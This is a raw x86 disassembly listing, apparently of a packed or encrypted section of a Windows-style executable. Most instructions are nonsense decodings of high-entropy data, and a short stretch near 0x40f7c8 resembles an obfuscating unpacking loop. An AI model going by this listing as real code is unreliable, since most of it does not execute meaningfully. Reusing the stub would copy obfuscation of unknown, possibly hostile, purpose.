  40f23a:	mov    ch,0x48
  40f23c:	or     bh,BYTE PTR [eax+ebp*8]
  40f23f:	das    
  40f240:	dec    edi
  40f241:	adc    al,dl
  40f243:	out    dx,al
  40f244:	xor    BYTE PTR [edi+eiz*8+0x60],al
  40f248:	iret   
  40f249:	(bad)
  40f24e:	mov    ds:0x6870d064,eax
  40f253:	dec    eax
  40f254:	pop    eax
  40f255:	push   ebp
  40f256:	sub    bh,ch
  40f258:	mov    bl,0x4c
  40f25a:	dec    ecx
  40f25b:	jmp    0xfb2bb2f7
  40f260:	mov    edx,0xa596d5e8
  40f265:	inc    BYTE PTR ds:0xcf59f8b6
  40f26b:	dec    edx
  40f26c:	call   0x44bc:0x23435ee0
  40f273:	es pusha 
  40f275:	push   ebp
  40f276:	imul   eax,DWORD PTR [edi],0xffffff96
  40f279:	stos   DWORD PTR es:[edi],eax
  40f27a:	push   0x70a9de47
  40f27f:	std    
  40f280:	pop    es
  40f281:	and    eax,0x67af9660
  40f286:	mov    bl,0x99
  40f288:	lahf   
  40f289:	out    dx,al
  40f28a:	dec    edi
  40f28b:	shl    DWORD PTR ds:0x515fc7a6,0x53
  40f292:	or     eax,0x1841f4a0
  40f297:	ins    DWORD PTR es:[edi],dx
  40f298:	mov    eax,0xdabd03f6
  40f29d:	mov    ebx,DWORD PTR [ecx+0x66]
  40f2a0:	outs   dx,BYTE PTR ds:[esi]
  40f2a1:	dec    edx
  40f2a2:	cmp    eax,0xa605438
  40f2a7:	sti    
  40f2a8:	add    cl,cl
  40f2aa:	or     ebp,0x656630bb
  40f2b0:	and    ebx,DWORD PTR [ecx+edi*4]
  40f2b3:	mov    eax,0x2417090b
  40f2b8:	xchg   esi,eax
  40f2b9:	or     eax,0x297f6d55
  40f2be:	bound  ecx,QWORD PTR [eax+ebp*1]
  40f2c1:	imul   edx,DWORD PTR [ecx],0xffffffd6
  40f2c4:	scas   eax,DWORD PTR es:[edi]
  40f2c5:	cmp    dl,BYTE PTR [esi+0x75]
  40f2c8:	pushf  
  40f2c9:	push   0xfb076094
  40f2ce:	xor    al,0x37
  40f2d0:	pop    ebp
  40f2d1:	sar    BYTE PTR [eax-0xfb2d958],cl
  40f2d7:	mov    ds:0xb77c2e0a,al
  40f2dc:	leave  
  40f2dd:	inc    esp
  40f2de:	leave  
  40f2df:	ins    DWORD PTR es:[edi],dx
  40f2e0:	dec    edx
  40f2e1:	mov    ds:0x9257504,al
  40f2e6:	lods   eax,DWORD PTR ds:[esi]
  40f2e7:	pusha  
  40f2e8:	retf   
  40f2e9:	mov    esi,0xa7fc039f
  40f2ee:	xchg   cl,bl
  40f2f0:	ror    ecx,cl
  40f2f2:	not    DWORD PTR [ebx]
  40f2f4:	jae    0x40f371
  40f2f6:	xlat   BYTE PTR ds:[ebx]
  40f2f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2f8:	fldpi  
  40f2fa:	dec    eax
  40f2fb:	adc    DWORD PTR [ecx+0x6a994235],edi
  40f301:	inc    edx
  40f302:	mov    edx,0xdd416b36
  40f307:	and    bl,dl
  40f309:	pop    esp
  40f30a:	mov    dl,0x1b
  40f30c:	or     eax,DWORD PTR es:[ebx-0x35]
  40f310:	sub    dl,BYTE PTR [edi]
  40f312:	jp     0x40f29c
  40f314:	in     eax,dx
  40f315:	add    al,0xa8
  40f318:	cmp    BYTE PTR [ebx],bh
  40f31a:	jg     0x40f35a
  40f31c:	pop    edx
  40f31d:	and    al,0x41
  40f31f:	mov    ah,0x29
  40f321:	and    al,0x59
  40f323:	sub    DWORD PTR [edx],0xf73edbb7
  40f329:	scas   al,BYTE PTR es:[edi]
  40f32a:	pop    eax
  40f32b:	call   0x6fd7:0x8c779fd6
  40f332:	leave  
  40f333:	push   cs
  40f334:	pop    esi
  40f335:	ds sub al,0xe6
  40f338:	push   ds
  40f339:	je     0x40f398
  40f33b:	imul   ecx,DWORD PTR [ebp+0x55a30ed8],0x5d56695b
  40f345:	jecxz  0x40f3bf
  40f347:	mov    dl,BYTE PTR [edi]
  40f349:	add    di,WORD PTR [ecx+0x65c96745]
  40f350:	leave  
  40f351:	mov    al,0xf6
  40f353:	adc    BYTE PTR [esi+ebx*8],dl
  40f356:	ds popf 
  40f358:	add    DWORD PTR [eax],esi
  40f35a:	ss or  eax,0x8879eb6e
  40f360:	add    DWORD PTR [edi],ebx
  40f362:	clc    
  40f363:	adc    ebp,DWORD PTR ds:0x5952bbdc
  40f369:	pop    ss
  40f36a:	(bad)  
  40f36d:	pop    ebx
  40f36e:	sub    BYTE PTR [edx+ecx*2+0x32],bl
  40f372:	(bad)  
  40f373:	test   al,0x42
  40f375:	add    BYTE PTR [esi],al
  40f377:	and    DWORD PTR [esi+0x69ff94fd],edi
  40f37d:	aaa    
  40f37e:	sbb    esp,ebp
  40f380:	pop    ebx
  40f381:	mov    ds:0x22acf821,eax
  40f386:	and    al,BYTE PTR [ecx]
  40f388:	or     ah,BYTE PTR [esi-0x40d8d71e]
  40f38e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f38f:	int3   
  40f390:	ss sub esp,eax
  40f393:	rcl    DWORD PTR [edx],cl
  40f395:	push   cs
  40f396:	or     DWORD PTR [edi-0x2],ebp
  40f399:	call   0xb948:0x6fdd334a
  40f3a0:	lods   eax,DWORD PTR ds:[esi]
  40f3a1:	inc    edi
  40f3a2:	add    al,0x24
  40f3a4:	sub    al,0x42
  40f3a6:	adc    eax,0xea184890
  40f3ab:	or     edi,DWORD PTR [ebx+0x2413aac]
  40f3b1:	cli    
  40f3b2:	and    DWORD PTR [eax-0x4da9bd41],ebp
  40f3b8:	in     al,0x68
  40f3ba:	xchg   BYTE PTR [ebx],bh
  40f3bc:	push   ds
  40f3bd:	retf   0x3bf6
  40f3c0:	pop    eax
  40f3c1:	loopne 0x40f3d3
  40f3c3:	add    BYTE PTR [ebp-0x44],0x6
  40f3c7:	aam    0x6a
  40f3c9:	sbb    al,0xd0
  40f3cb:	inc    ecx
  40f3cc:	mov    edi,0x3996c8fe
  40f3d1:	gs and al,0xf1
  40f3d4:	int3   
  40f3d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3d6:	xor    dh,BYTE PTR ss:[ebp+0x3407969e]
  40f3dd:	xchg   esp,eax
  40f3de:	mov    bh,ah
  40f3e0:	jno    0x40f442
  40f3e2:	jo     0x40f40d
  40f3e4:	push   cs
  40f3e5:	xor    BYTE PTR [ebx-0xc66f8a5],0xf4
  40f3ec:	fisub  WORD PTR [edi+eiz*4-0x2b]
  40f3f0:	shl    cl,cl
  40f3f2:	mov    bh,BYTE PTR [edx-0x2327943c]
  40f3f8:	test   al,0x1f
  40f3fa:	div    DWORD PTR [eax+0xf7cfed8]
  40f400:	stos   DWORD PTR es:[edi],eax
  40f401:	push   es
  40f402:	inc    edi
  40f403:	push   cs
  40f404:	add    al,0x3a
  40f406:	sbb    edx,DWORD PTR [edx-0x4a]
  40f409:	mov    edi,0xb7f9ef79
  40f40e:	call   0x9855:0x8b60e59d
  40f415:	push   cs
  40f416:	mov    dh,0x75
  40f418:	jg     0x40f422
  40f41a:	aad    0x10
  40f41c:	adc    ebp,DWORD PTR [edx]
  40f41e:	out    0xa2,al
  40f420:	(bad)  
  40f421:	(bad)  [edx]
  40f423:	sbb    BYTE PTR [ebx],bh
  40f425:	or     ebx,DWORD PTR [ecx-0x1b]
  40f428:	push   eax
  40f429:	ds clc 
  40f42b:	enter  0x2570,0x32
  40f42f:	cli    
  40f430:	nop
  40f431:	enter  0xa830,0x8b
  40f435:	stc    
  40f436:	and    ebx,DWORD PTR [ebx]
  40f438:	(bad)  
  40f439:	adc    DWORD PTR [eax+edi*1+0x2d80ffde],ecx
  40f440:	dec    edx
  40f441:	repnz cwde 
  40f443:	sbb    DWORD PTR [edi+0x26],ebp
  40f446:	enter  0x54bb,0xdb
  40f44a:	add    esp,eax
  40f44c:	iret   
  40f44d:	out    dx,al
  40f44e:	shl    BYTE PTR [edi],cl
  40f450:	and    ah,BYTE PTR [edi]
  40f452:	sbb    eax,0x13ed4176
  40f457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f458:	aad    0xca
  40f45a:	adc    eax,DWORD PTR [esi+0x5c]
  40f45d:	test   edi,esi
  40f45f:	out    dx,al
  40f460:	repnz jmp 0xcbec:0x9351d8
  40f468:	repnz sti 
  40f46a:	add    esp,DWORD PTR [eax+0x372fa9ac]
  40f470:	dec    esp
  40f471:	and    DWORD PTR [edx+0x76],esi
  40f474:	jno    0x40f441
  40f476:	rcl    BYTE PTR ds:0x14add1cd,1
  40f47c:	aad    0xfc
  40f47e:	dec    eax
  40f47f:	cmp    eax,0x4ec1ff5d
  40f484:	xchg   BYTE PTR [edi],cl
  40f486:	and    edi,DWORD PTR [esi+0x5e]
  40f489:	inc    edx
  40f48a:	xchg   ebp,eax
  40f48b:	stos   BYTE PTR es:[edi],al
  40f48c:	or     ebp,edi
  40f48e:	cld    
  40f48f:	inc    esi
  40f490:	leave  
  40f491:	ret    0x939f
  40f494:	pushf  
  40f495:	pop    eax
  40f496:	dec    ebp
  40f497:	fst    DWORD PTR [ebx-0x36e2b4d6]
  40f49d:	xchg   esi,eax
  40f49e:	rol    DWORD PTR [ecx],cl
  40f4a0:	ins    DWORD PTR es:[edi],dx
  40f4a1:	sbb    ch,al
  40f4a3:	adc    eax,0x551d40bd
  40f4a8:	sub    al,BYTE PTR [edx-0x6a]
  40f4ab:	in     eax,0x3b
  40f4ad:	or     ah,cl
  40f4af:	pushf  
  40f4b0:	pop    edi
  40f4b1:	pop    ss
  40f4b2:	popf   
  40f4b3:	xchg   ebx,eax
  40f4b4:	inc    eax
  40f4b5:	and    esi,eax
  40f4b7:	dec    ecx
  40f4b8:	push   ebx
  40f4b9:	(bad)  
  40f4ba:	mov    dh,0x35
  40f4bc:	jge    0x40f50f
  40f4be:	pop    ds
  40f4bf:	push   edi
  40f4c0:	adc    BYTE PTR [esi],al
  40f4c2:	pushf  
  40f4c3:	jno    0x40f52b
  40f4c5:	ss dec ebp
  40f4c7:	popf   
  40f4c8:	dec    esi
  40f4c9:	shl    DWORD PTR [eax+0x42d07504],1
  40f4cf:	pop    esi
  40f4d0:	sub    DWORD PTR [edi-0x1],ebp
  40f4d3:	call   DWORD PTR [ecx]
  40f4d5:	ins    DWORD PTR es:[edi],dx
  40f4d6:	xchg   esi,eax
  40f4d7:	call   0x9d260c57
  40f4dc:	inc    ecx
  40f4dd:	fcom   st(1)
  40f4df:	jb     0x40f4c4
  40f4e1:	mov    ch,0xd7
  40f4e3:	jb     0x40f47a
  40f4e5:	sar    BYTE PTR [edx+0x46],cl
  40f4e8:	rol    ch,cl
  40f4ea:	stc    
  40f4eb:	push   ebp
  40f4ec:	sti    
  40f4ed:	sub    ecx,edx
  40f4ef:	adc    al,0xaf
  40f4f1:	sbb    BYTE PTR [eax],cl
  40f4f3:	mov    ds:0x4de2fc7c,eax
  40f4f8:	adc    al,0x24
  40f4fa:	add    DWORD PTR [ebp+ebx*4-0x47b7111],esp
  40f501:	outs   dx,DWORD PTR ds:[esi]
  40f502:	out    0x6c,al
  40f504:	push   0x835c7ecb
  40f509:	push   edx
  40f50a:	push   0x8d95841b
  40f50f:	mov    edi,0x283d3381
  40f514:	out    dx,al
  40f515:	not    DWORD PTR [eax-0x15]
  40f518:	push   0xe777726e
  40f51d:	xlat   BYTE PTR ds:[ebx]
  40f51e:	stos   BYTE PTR es:[edi],al
  40f51f:	lds    esi,FWORD PTR [eax-0x348276b6]
  40f525:	test   DWORD PTR [edi],eax
  40f527:	adc    eax,0x3890b41b
  40f52c:	xor    BYTE PTR [edi],0x8e
  40f52f:	mov    ebx,0x71a533c8
  40f534:	loop   0x40f563
  40f536:	mov    ecx,0x33cb11f1
  40f53b:	in     eax,0x69
  40f53d:	bound  ebp,QWORD PTR [ecx+ebp*1]
  40f540:	pop    ds
  40f541:	imul   edx,esi,0x533188f5
  40f547:	mov    dh,0x73
  40f549:	and    al,0xbd
  40f54b:	push   esi
  40f54c:	jge    0x40f55f
  40f54e:	outs   dx,BYTE PTR ds:[esi]
  40f54f:	sbb    al,0xf0
  40f551:	mov    bh,ah
  40f553:	pop    eax
  40f554:	hlt    
  40f555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f556:	jne    0x40f5ce
  40f558:	rcr    DWORD PTR [eax+eax*4-0x29b56fd5],1
  40f55f:	hlt    
  40f560:	ds add eax,0xb3afa52b
  40f566:	loop   0x40f595
  40f568:	jns    0x40f5b2
  40f56a:	sbb    DWORD PTR [ebp+edx*8+0x17],0x60
  40f56f:	xchg   esi,eax
  40f570:	push   ecx
  40f571:	aas    
  40f572:	mov    esp,0xd9f3293f
  40f577:	mov    edi,0x58d04401
  40f57c:	bswap  edi
  40f57e:	repz push ebx
  40f580:	lods   al,BYTE PTR ds:[esi]
  40f581:	cmp    BYTE PTR [ebp+edx*8-0x3c91cd17],dh
  40f588:	and    eax,DWORD PTR [eax-0x253ad8ee]
  40f58e:	push   eax
  40f58f:	hlt    
  40f590:	xor    DWORD PTR [esi+edi*2+0x3a082f65],edi
  40f597:	mov    ebx,DWORD PTR [ecx]
  40f599:	(bad)  
  40f59a:	jae    0x40f5ea
  40f59c:	fistp  DWORD PTR [ebp+0x185c1db9]
  40f5a2:	xchg   DWORD PTR [ebp-0x2b],ebx
  40f5a5:	pop    ebx
  40f5a6:	and    al,0xd9
  40f5a8:	push   esp
  40f5a9:	mov    ch,0xfa
  40f5ac:	add    al,0xed
  40f5ae:	xchg   esi,eax
  40f5af:	adc    ebp,ebp
  40f5b1:	pop    ss
  40f5b2:	dec    edi
  40f5b3:	mov    ebp,0xfe7c698a
  40f5b8:	out    dx,al
  40f5b9:	xchg   ebp,eax
  40f5ba:	add    eax,ebp
  40f5bc:	shl    DWORD PTR gs:[ecx],cl
  40f5bf:	sub    eax,0x85b86506
  40f5c4:	pop    ss
  40f5c5:	mov    BYTE PTR [edx-0x563907a1],0xe0
  40f5cc:	add    eax,DWORD PTR [ecx]
  40f5ce:	mov    DWORD PTR [ecx+0x48af68a0],eax
  40f5d4:	xchg   edx,eax
  40f5d5:	aad    0xcc
  40f5d7:	mov    ?,eax
  40f5d9:	push   ebx
  40f5da:	mov    esi,0xcef6cedc
  40f5df:	in     al,dx
  40f5e0:	jle    0x40f639
  40f5e2:	add    al,0x2d
  40f5e4:	(bad)  
  40f5e5:	and    DWORD PTR [ebp+ebx*8+0x239e67cb],esi
  40f5ec:	mov    cl,0xd5
  40f5ee:	adc    edi,DWORD PTR [ecx-0x5d6295d9]
  40f5f4:	jge    0x40f62b
  40f5f6:	xchg   BYTE PTR [ebp+0x44],ah
  40f5f9:	inc    edi
  40f5fa:	(bad)  
  40f5fb:	jb     0x40f619
  40f5fd:	cmc    
  40f5fe:	mov    cl,0x3c
  40f600:	mov    bh,0xe9
  40f602:	fninit 
  40f604:	cmc    
  40f605:	jg     0x40f587
  40f607:	sbb    BYTE PTR [edx],ah
  40f609:	jp     0x40f681
  40f60b:	jge    0x40f5e5
  40f60d:	mov    esp,0xa025482e
  40f612:	sub    al,0x8d
  40f614:	xchg   esi,eax
  40f615:	xchg   ebp,eax
  40f616:	ret    0xd1ea
  40f619:	sub    al,0x30
  40f61b:	dec    esp
  40f61c:	(bad)  
  40f61d:	icebp  
  40f61e:	out    0x91,al
  40f620:	push   0xffffffab
  40f622:	imul   ebp,DWORD PTR [ebx+ecx*2-0x4f],0x640f6ed4
  40f62a:	inc    ecx
  40f62b:	push   0xc915afa7
  40f630:	call   0x8998:0xca3dbab9
  40f637:	(bad)  
  40f638:	cmp    cl,BYTE PTR [esi]
  40f63a:	jno    0x40f5cc
  40f63c:	push   cs
  40f63d:	fst    DWORD PTR [edx+eax*1+0x45b79890]
  40f644:	pop    ecx
  40f645:	lods   al,BYTE PTR ds:[esi]
  40f646:	mov    WORD PTR [edi+0x3845fab2],cs
  40f64c:	jecxz  0x40f6b9
  40f64e:	ins    DWORD PTR es:[edi],dx
  40f64f:	adc    al,BYTE PTR [ebx]
  40f651:	loop   0x40f6a8
  40f653:	sub    al,0xb7
  40f655:	pushf  
  40f656:	sub    al,0x1a
  40f658:	adc    al,0x4e
  40f65a:	mov    esp,0xfdbd4cc6
  40f65f:	mov    esi,esp
  40f661:	aad    0x1d
  40f663:	mov    ds,esp
  40f665:	daa    
  40f666:	xchg   ecx,eax
  40f667:	add    eax,0xbe46dc99
  40f66c:	ss adc al,0x89
  40f66f:	mov    al,BYTE PTR [edx+0x3f7715a2]
  40f675:	mov    cl,0x67
  40f677:	or     DWORD PTR [ebx-0x434d01bd],ebp
  40f67d:	cli    
  40f67e:	mov    eax,ds:0xcccc8cfd
  40f683:	pop    ds
  40f684:	push   ecx
  40f685:	jnp    0x40f682
  40f687:	stos   BYTE PTR es:[edi],al
  40f688:	aas    
  40f689:	xchg   esp,eax
  40f68a:	mov    ah,0xe3
  40f68c:	add    ecx,DWORD PTR [eax]
  40f68e:	aas    
  40f68f:	mov    ecx,0x904f6169
  40f694:	xor    al,0xdd
  40f696:	or     BYTE PTR [ebp-0x1c5c9463],ah
  40f69c:	mov    ebx,0xe7213eae
  40f6a1:	pop    edx
  40f6a2:	imul   edi,DWORD PTR [esi],0x4a7ebe5f
  40f6a8:	lods   al,BYTE PTR ds:[esi]
  40f6a9:	lods   al,BYTE PTR ds:[esi]
  40f6aa:	inc    ecx
  40f6ab:	test   al,0xc8
  40f6ad:	mov    ds:0xd8b5fbdc,eax
  40f6b2:	jmp    0xfc0a:0x9a507e53
  40f6b9:	mov    bl,0xb6
  40f6bb:	xchg   esi,eax
  40f6bc:	add    al,0x94
  40f6be:	into   
  40f6bf:	div    BYTE PTR [edi+0x179bca69]
  40f6c5:	popa   
  40f6c6:	out    dx,eax
  40f6c7:	retf   0x50df
  40f6ca:	ss mov al,0x63
  40f6cd:	dec    edi
  40f6ce:	into   
  40f6cf:	xor    eax,0xb0176344
  40f6d4:	xor    dh,BYTE PTR [eax]
  40f6d6:	jns    0x40f6e9
  40f6d8:	mov    dh,0xc1
  40f6da:	mov    al,ds:0x1b9fcebd
  40f6df:	mov    cl,0x2b
  40f6e1:	cmp    eax,0xa2c4364f
  40f6e6:	mov    dl,0x4d
  40f6e8:	adc    al,0x29
  40f6ea:	js     0x40f6d9
  40f6ec:	in     eax,0x72
  40f6ee:	scas   eax,DWORD PTR es:[edi]
  40f6ef:	in     eax,dx
  40f6f0:	call   0xa08e45ab
  40f6f5:	(bad)
  40f6f8:	pop    esp
  40f6f9:	(bad)  
  40f6fa:	ja     0x40f746
  40f6fc:	pop    ebx
  40f6fd:	mov    ch,0x2c
  40f6ff:	test   eax,0xab3bce5a
  40f704:	push   edi
  40f705:	lock sub BYTE PTR [esi-0x34],bh
  40f709:	out    dx,eax
  40f70a:	hlt    
  40f70b:	mov    bl,0xd4
  40f70d:	push   ecx
  40f70e:	xlat   BYTE PTR ds:[ebx]
  40f70f:	jo     0x40f6a6
  40f711:	ins    BYTE PTR es:[edi],dx
  40f712:	pop    edx
  40f713:	fcmovnbe st,st(3)
  40f715:	pop    ebp
  40f716:	mov    cl,0xce
  40f718:	mov    ch,0x8c
  40f71a:	ret    
  40f71b:	xor    al,0x8f
  40f71d:	pop    ebx
  40f71e:	fcomp  QWORD PTR [eax]
  40f720:	cld    
  40f721:	sbb    al,0x42
  40f723:	in     eax,0x2f
  40f725:	xchg   edx,eax
  40f726:	pop    edi
  40f727:	les    ecx,FWORD PTR [eax+0x5735244b]
  40f72d:	and    eax,0xd80a2b89
  40f732:	fstp   DWORD PTR [edx-0x7deafccb]
  40f738:	pop    esp
  40f739:	sbb    DWORD PTR [esi],ecx
  40f73b:	(bad)  
  40f73c:	scas   eax,DWORD PTR es:[edi]
  40f73d:	dec    esp
  40f73e:	xor    edi,esi
  40f740:	push   esp
  40f741:	xchg   DWORD PTR [eax+ebx*8-0x14cc7434],eax
  40f748:	cwde   
  40f749:	aas    
  40f74a:	ins    BYTE PTR es:[edi],dx
  40f74b:	push   ebx
  40f74c:	push   ebp
  40f74d:	and    eax,ecx
  40f74f:	das    
  40f750:	shl    BYTE PTR [eax-0x1979c942],0xb1
  40f757:	imul   edx,ecx,0x800d100d
  40f75d:	ret    0xf5ec
  40f760:	push   ebp
  40f761:	aas    
  40f762:	(bad)
  40f766:	je     0x40f7b9
  40f768:	cmp    al,BYTE PTR [ebx-0x29ab4b67]
  40f76e:	ss push ds
  40f770:	cwde   
  40f771:	mov    ds:0xb5bee352,al
  40f776:	call   0x9aed3e86
  40f77b:	sbb    BYTE PTR gs:[ebx-0x26],0xce
  40f780:	adc    dl,al
  40f782:	sub    eax,0xb33c0b8c
  40f787:	and    BYTE PTR [edi-0x1a035629],0x20
  40f78e:	push   edx
  40f78f:	pop    ss
  40f790:	(bad)  
  40f791:	sub    al,0x2d
  40f793:	mov    dl,0xee
  40f795:	jle    0x40f790
  40f797:	mov    ecx,0x32936b4b
  40f79c:	loope  0x40f7ae
  40f79e:	push   edx
  40f79f:	int    0xb0
  40f7a1:	retf   0xf503
  40f7a4:	std    
  40f7a5:	mov    bl,0xc0
  40f7a7:	sub    DWORD PTR [eax+ecx*8-0x47],0x4e
  40f7ac:	cmp    eax,DWORD PTR [ebx+eax*1+0x13626681]
  40f7b3:	and    DWORD PTR [ecx],0xfd756f47
  40f7b9:	adc    al,0xed
  40f7bb:	jp     0x40f834
  40f7bd:	xchg   esp,eax
  40f7be:	jg     0x40f7ab
  40f7c0:	lock repnz add dh,BYTE PTR [ebx-0x4c46c512]
  40f7c8:	or     BYTE PTR [ecx+0x7],dl
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0xeb3545ac
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	push   es
  40f871:	pop    ebp
  40f872:	adc    al,0x3d
  40f874:	mov    dh,0x7b
  40f876:	ss dec dh
  40f879:	out    0xd3,al
  40f87b:	mov    BYTE PTR [ecx-0xefadad1],ah
  40f881:	and    dh,BYTE PTR [edi+0x1b]
  40f884:	push   esp
  40f885:	xchg   ebp,eax
  40f886:	stc    
  40f887:	jne    0x40f8f2
  40f889:	mov    DWORD PTR [edx+ebx*2-0x531d4aaa],ecx
  40f890:	xchg   BYTE PTR [edx],al
  40f892:	call   0x8393:0x688a7d34
  40f899:	cmp    al,0xb0
  40f89b:	aad    0x85
  40f89d:	jne    0x40f8c5
  40f89f:	cs push cs
  40f8a1:	mov    al,bh
  40f8a3:	sub    edx,DWORD PTR [esi-0x39]
  40f8a6:	(bad)  
  40f8a7:	(bad)  
  40f8a8:	jo     0x40f885
  40f8aa:	mov    BYTE PTR [edx-0x8c0e5d9],ah
  40f8b0:	jno    0x40f888
  40f8b2:	shr    bh,1
  40f8b4:	push   0xffffffcd
  40f8b6:	jmp    DWORD PTR [eax]
  40f8b8:	sbb    eax,0xc38886d7
  40f8bd:	push   edi
  40f8be:	sbb    al,BYTE PTR [eax]
  40f8c0:	rcr    DWORD PTR [ebx-0x70f4e592],0xd7
  40f8c7:	outs   dx,DWORD PTR ds:[esi]
  40f8c8:	ds jmp 0x1fa0824c
  40f8ce:	xchg   esi,eax
  40f8cf:	scas   eax,DWORD PTR es:[edi]
  40f8d0:	pop    edx
  40f8d1:	inc    ebp
  40f8d2:	lods   al,BYTE PTR ds:[esi]
  40f8d3:	sub    ecx,esp
  40f8d5:	ins    BYTE PTR es:[edi],dx
  40f8d6:	inc    edx
  40f8d7:	push   esp
  40f8d8:	sbb    eax,0x19fec2bd
  40f8dd:	xchg   esi,eax
  40f8de:	xchg   BYTE PTR [ebx+eax*2+0x1f0a72ef],bl
  40f8e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8e6:	push   esp
  40f8e7:	and    al,0xbf
  40f8e9:	mov    ebp,0xc840bec6
  40f8ee:	(bad)  
  40f8ef:	jecxz  0x40f8da
  40f8f1:	mov    eax,ds:0x54ea8a7b
  40f8f6:	or     BYTE PTR ds:0x2c38e76e,dl
  40f8fc:	adc    ebx,DWORD PTR [ebx+esi*8]
  40f8ff:	pop    edx
  40f900:	mov    ah,0xed
  40f902:	pop    ss
  40f903:	xchg   esp,eax
  40f904:	dec    esp
  40f905:	xor    al,0xe0
  40f907:	adc    al,0x62
  40f909:	imul   ebx,DWORD PTR [ebx+0x16],0xd
  40f90d:	fmul   st(3),st
  40f90f:	or     edx,DWORD PTR [esi+0x5b]
  40f912:	icebp  
  40f913:	or     al,0x84
  40f915:	cmp    DWORD PTR [esi+0xdcfaebc],0xffffffa5
  40f91c:	out    dx,eax
  40f91d:	aad    0xe5
  40f91f:	sbb    DWORD PTR [esi],ecx
  40f921:	xchg   esp,eax
  40f922:	xor    eax,0xac549526
  40f927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f928:	add    DWORD PTR [esi],0xffffff8c
  40f92b:	fstp   DWORD PTR [edx-0xd]
  40f92e:	jb     0x40f908
  40f930:	mov    al,ds:0x96856ed5
  40f935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f936:	lahf   
  40f937:	scas   eax,DWORD PTR es:[edi]
  40f938:	sub    edx,DWORD PTR [eax-0x12]
  40f93b:	and    al,0x9b
  40f93d:	xor    al,0xd2
  40f93f:	(bad)  
  40f940:	clc    
  40f941:	xchg   ebp,eax
  40f942:	push   eax
  40f943:	mov    ebx,0x36b902fa
  40f948:	fadd   st(6),st
  40f94a:	jbe    0x40f930
  40f94c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f94d:	scas   eax,DWORD PTR es:[edi]
  40f94e:	lahf   
  40f94f:	(bad)  
  40f950:	(bad)  
  40f951:	mov    al,0x17
  40f953:	mov    bl,0x74
  40f955:	clc    
  40f956:	mov    dh,0x8a
  40f958:	enter  0x1c0e,0x69
  40f95c:	or     edi,DWORD PTR [edx]
  40f95e:	lods   eax,DWORD PTR ds:[esi]
  40f95f:	jle    0x40f9b2
  40f961:	call   0x1054a88
  40f966:	lahf   
  40f967:	dec    esi
  40f968:	add    ecx,DWORD PTR ds:0x23ea1891
  40f96e:	inc    esp
  40f96f:	pop    ds
  40f970:	fistp  QWORD PTR [ecx+0x34]
  40f973:	pusha  
  40f974:	or     DWORD PTR [ebp-0x38],esi
  40f977:	or     al,0x8d
  40f979:	addr16 inc edi
  40f97b:	mov    al,ds:0x6c1b0754
  40f980:	cdq    
  40f981:	add    al,0x96
  40f983:	retf   
  40f984:	dec    eax
  40f985:	dec    ebp
  40f986:	fbstp  TBYTE PTR [edi+0xbd4dfa0]
  40f98c:	mov    BYTE PTR [ebp+0x1dabd990],ch
  40f992:	test   dl,cl
  40f994:	fdivr  QWORD PTR [esi]
  40f996:	mov    DWORD PTR [esi],ebp
  40f998:	xor    dh,BYTE PTR [edx]
  40f99a:	pop    ebx
  40f99b:	test   BYTE PTR [esi],ah
  40f99d:	jae    0x40f9f0
  40f99f:	xchg   esi,eax
  40f9a0:	mov    ebx,0x81fa1cb3
  40f9a5:	pop    ebx
  40f9a6:	jns    0x40f9d3
  40f9a8:	mov    al,0x40
  40f9aa:	clc    
  40f9ab:	(bad)  
  40f9ac:	in     eax,0xea
  40f9ae:	push   esp
  40f9af:	xchg   edi,eax
  40f9b0:	loop   0x40f973
  40f9b2:	jmp    0x40f97e
  40f9b4:	mov    bl,0xcd
  40f9b6:	outs   dx,BYTE PTR ds:[esi]
  40f9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9b8:	sub    edx,DWORD PTR ds:0x9c466827
  40f9be:	std    
  40f9bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9c0:	ds or  al,0x5f
  40f9c3:	xchg   ch,bl
  40f9c5:	lahf   
  40f9c6:	or     al,0xf4
  40f9c8:	ss stc 
  40f9ca:	stc    
  40f9cb:	retf   0xc488
  40f9ce:	pop    es
  40f9cf:	gs int 0xf3
  40f9d2:	out    0x71,al
  40f9d4:	pusha  
  40f9d5:	mov    ds:0x2a42f559,al
  40f9da:	shl    dl,0x75
